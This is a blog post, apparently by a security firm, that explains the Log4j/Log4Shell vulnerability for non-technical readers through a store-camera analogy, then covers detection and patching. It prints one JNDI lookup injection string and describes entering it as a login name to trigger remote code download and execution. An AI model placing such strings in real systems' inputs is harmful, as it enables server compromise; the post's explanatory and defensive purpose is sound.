---
title: Understanding the Log4j and Log4Shell Vulnerabilities through Surveillance Cameras
date: 2021-12-18 13:00:00
tags: [Security]
categories: [Security]
photos: /img/what-is-log4j-and-log4shell/cover-en.png
---

The biggest news in the cybersecurity industry at the end of 2021 is undoubtedly the Log4j vulnerability, also known as CVE-2021-44228 or Log4Shell. Some even describe it as a "nuclear-level vulnerability," highlighting the far-reaching impact of this vulnerability.

While there are many technical analyses of the vulnerability, those without technical backgrounds may only know that the vulnerability is severe without understanding why or how it works. Therefore, I want to write a more straightforward article that non-technical people can understand.

<!-- more -->

## Starting with Surveillance Cameras

I have a friend named Xiao Ming, who runs a grocery store. Like other stores, there is a surveillance camera in the store to record everything 24/7 in case of disputes or theft. However, the camera's field of view is limited, and it cannot capture the entire store. Even if it could, storing all that data would be too much (unless Xiao Ming is rich and buys a bunch of cameras). Therefore, the camera only focuses on critical areas, such as the cash register.

For over a decade, there were no issues with the camera. After all, it's just recording video, what could go wrong? But recently, someone discovered a hidden feature of the camera (strictly speaking, it's not a hidden feature since it's mentioned in the camera's manual, but few people bother to read the hundred-plus pages). 

What is this feature? Besides recording video, the camera also has an intelligent image recognition feature. If it sees specific images, it will execute corresponding actions based on the image's content. For example, this image recognition feature requires instructions to be written on a 100x100 board with a black background, white text, and a specific format, like this:

![](/img/what-is-log4j-and-log4shell/command.png)

When the camera sees the image above, which matches the specific format, it executes the command: "Shutdown," and the camera shuts down! But shutting down is not the only thing the command can do. It can also be written to "give me all the camera data" or perform operations on other servers that the camera is connected to, such as stealing all the data.

In short, once the camera captures something in the specified format, it will execute the command for you.

After this feature was exposed, chaos ensued because there are surveillance cameras everywhere. Therefore, many people brought this board to see if it would trigger this feature. Only one camera model called log4j has issues, while others do not. However, some cameras are based on log4j and have been modified, so they will also have problems.

Even things that are not cameras can have issues. For example, a smart refrigerator claims to have a miniature camera that can monitor the inside of the refrigerator in real-time. Coincidentally, this miniature camera is a modified version of the log4j camera model, so it has the same problem.

Think about it. If surveillance cameras have this problem, then so many people around the world use this camera model. It will undoubtedly cause a huge uproar because once the camera captures something in the specified format, it will execute the command, which is severe.

The above is a simple analogy of the log4j vulnerability. In this story, the grocery store is like your website, and the camera's function is to record (log) requests to your website. There are only two key points to remember in this story:

1. Log4j is used to record things.
2. The vulnerability principle is that recording certain specific text formats will trigger a function that can execute code.

The simple analogy ends here. To understand log4j better, we must first understand what logs are.

## About Logs

The Chinese translation of logs is "日誌," and I believe many people are familiar with this term. If you have worked with engineers, they may say, "I'll check the logs" when solving problems. Or if you and your partner have different opinions, he says A, and you say B, you might say, "Let's check the logs to see whose problem it is."

When you work with the IT department to solve small computer problems, he will also ask you to copy logs from a specific location to help him understand what happened.

Logs are like a 24/7 surveillance camera that needs to record the status of important things.

So why do we need logs? This question is like "Why do we need surveillance cameras?" The answer is simple: because there is evidence when something goes wrong. Just like a driving recorder, if you have an accident, it can help determine who is at fault.

For example, suppose I am Company A, and we run an online shopping website. Usually, we do not handle the payment process ourselves but cooperate with other payment service providers. We "connect" the payment service provider's functions in the backend. In simpler terms, "when the user wants to pay, I redirect them to the payment service provider's page, and when they finish paying, I redirect them back to our website." I believe many people who shop online are familiar with this process.

In this process, both parties must keep records to ensure that there is evidence to assist in explaining any future problems.

For example, one day, Company A suddenly received a bunch of complaints saying that they could not make payments. Company A called the payment service provider and complained that their service was terrible and suddenly stopped working. However, the payment service provider provided server logs, saying, "No, we haven't received any records from you since 8 am today. It should be your problem." Later, Company A checked its own service and found that there was a problem with the version update this morning, and it had nothing to do with the payment service provider.



This is the importance of logs. When something goes wrong, you have evidence to investigate and try to restore the original situation as much as possible.

As developers, we all know the importance of logs, so logs are basically a must-have. For a website backend, it may leave a log when a transaction fails, or write a log when an unexpected error occurs, or use a log to record some fields in the request, such as the browser version, for use by the company's internal data analysis system.

Therefore, logs are a very common feature. This is also why if this feature goes wrong, the consequences can be very serious.

## What is log4j?

When writing code for a website backend, there are different programming languages to choose from, such as Python, JavaScript, PHP, or Java, and these programming languages will have some packages specialized in logging, which means someone has already written the functionality for you, and you just need to use it.

Java has a very useful logging package called log4j. This package belongs to the Apache Software Foundation, so its full name is Apache Log4j.

There are many different software and packages under Apache, such as:

* Apache HTTP Server (the most commonly seen one)
* Apache Cassandra
* Apache Tomcat
* Apache Hadoop
* Apache Struts
* ...

So Apache Server and Apache log4j are completely different things. I know you use Apache Server, but whether you use log4j is another matter.

The package that caused the problem this time is log4j, and the reason for the problem is the same as what I said at the beginning. There is a little-known feature with a security vulnerability. As long as log4j records something in a specific format when logging, it will execute the corresponding code, just like the "shutdown" board mentioned at the beginning.

To be more specific, it does not directly execute the code. The specific format looks like this:

```
${jndi:ldap://cymetrics.io/test}
```

Don't worry about the words you can't understand. You can clearly see that there is a string that looks like a URL inside. Yes, it is a URL. When log4j records the above string, it finds that the string matches a specific format, so it will download the code from the URL (`cymetrics.io/test`) and execute it. Therefore, this is a Remote Code Execution (RCE) vulnerability.

As I mentioned earlier, the backend will record many things. For example, if a backend service is written in Java and uses log4j to record the account entered when the user logs in fails, then I only need to log in with the account `${jndi:ldap://cymetrics.io/test}` to trigger the log4j vulnerability and execute the code I prepared.

As long as I can execute code, I can do many things, such as stealing data from the server or installing mining software to mine for me, and so on.

## Why is this vulnerability so serious?

First, log4j is used by a large number of people. Almost everyone who uses Java will use this package to record logs.

Second, the trigger method is easy. You only need to fill various parts of the request with these problematic strings. As long as the server records one of them, it can trigger the vulnerability, and as mentioned earlier, recording logs is a common thing.

Third, the impact is huge. Once the vulnerability is triggered, it is the most serious RCE, which can directly execute any code.

Combining these three points makes it a nuclear-level vulnerability. How serious is it? Just look at these news headlines:

1. [Apache Log4j vulnerability has a huge impact, US cybersecurity agencies order government agencies to fix it immediately](https://blog.twnic.tw/2021/12/16/21369/)
2. [Microsoft and Apple are affected! Log framework Apache Log4j has a vulnerability, which is the biggest cybersecurity threat in nearly 10 years](https://www.bnext.com.tw/article/66743/log4j-cybersecurity?fbclid=IwAR1JEHJxA3nUaPVXglcxE1qrDRrRNHkPent3FdXBgtAGYKBxXDGUozt-Yyc)
3. [【Log4Shell vulnerability information update】Log4j 2.15.0 is not fully patched, Apache releases version 2.16.0, and national hackers have started to act](https://www.ithome.com.tw/news/148391)

One more thing I almost forgot to mention is that many other software also use the log4j package, so they may also have problems. Someone has compiled a list of affected software abroad: [Log4Shell log4j vulnerability (CVE-2021-44228 / CVE-2021-45046) - cheat-sheet reference guide](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/), which is a long list. For example, the server of the game Minecraft also uses log4j, so it is also affected by this vulnerability.

## How to know if I am affected by this vulnerability?

You can first check if your program uses the log4j package and its version, and also check if any of the other software listed in the above list is used.

If you are an engineer, you can also use some existing tools to detect if you are affected by the vulnerability, such as: [log4j-scan](https://github.com/fullhunt/log4j-scan) or [log4j-tools](https://github.com/jfrog/log4j-tools) provided by jfrog.

Or if you really don't know how to deal with it, you can also [contact us](https://cymetrics.io/zh-tw/free-rating) to see how we can help you.

## How to fix it?

In this article published by Swiss CERT: [Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/), there is a chart that shows how to defend against it from various aspects:

![](/img/what-is-log4j-and-log4shell/attack.png)

If there is no time to fix the root cause, you can first use WAF (Web Application Firewall), which is a firewall for websites that blocks malicious strings, such as [Cloudflare](https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/) which added WAF rules to block it at the first time. However, many people are researching how to bypass WAF rules, so this is a temporary solution.

The fundamental solution is to disable or upgrade log4j to a version that is not affected by this vulnerability. However, sometimes the first version may not completely fix the vulnerability, so remember to closely monitor if there are updated versions after the upgrade. For example, shortly after this article was written, the official released the third patch to fix other related issues: [Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability](https://thehackernews.com/2021/12/apache-issues-3rd-patch-to-fix-new-high.html)

## Conclusion

A widely used package, combined with a common function, and a simple attack method with serious consequences, has become a vulnerability that can be recorded in history.

Some of the metaphors in the article may be simplified versions to avoid being too detailed, and may not fully cover the original vulnerability. There may be some omissions in the process of converting it into a story metaphor, but I think it does not have a big impact on the overall understanding.

If you want to understand more technical details and timelines, I highly recommend this video: [Hackers vs. Developers // CVE-2021-44228 Log4Shell](https://www.youtube.com/watch?v=w2F67LbEtnk&t=16s&ab_channel=LiveOverflow), which explains it very clearly and also discusses the relationship between developers and cybersecurity practitioners.

Finally, I hope this article can help those who do not understand technology to better understand what log4shell is and why this vulnerability is so serious. If there are any errors in the article, please feel free to leave a comment, thank you.
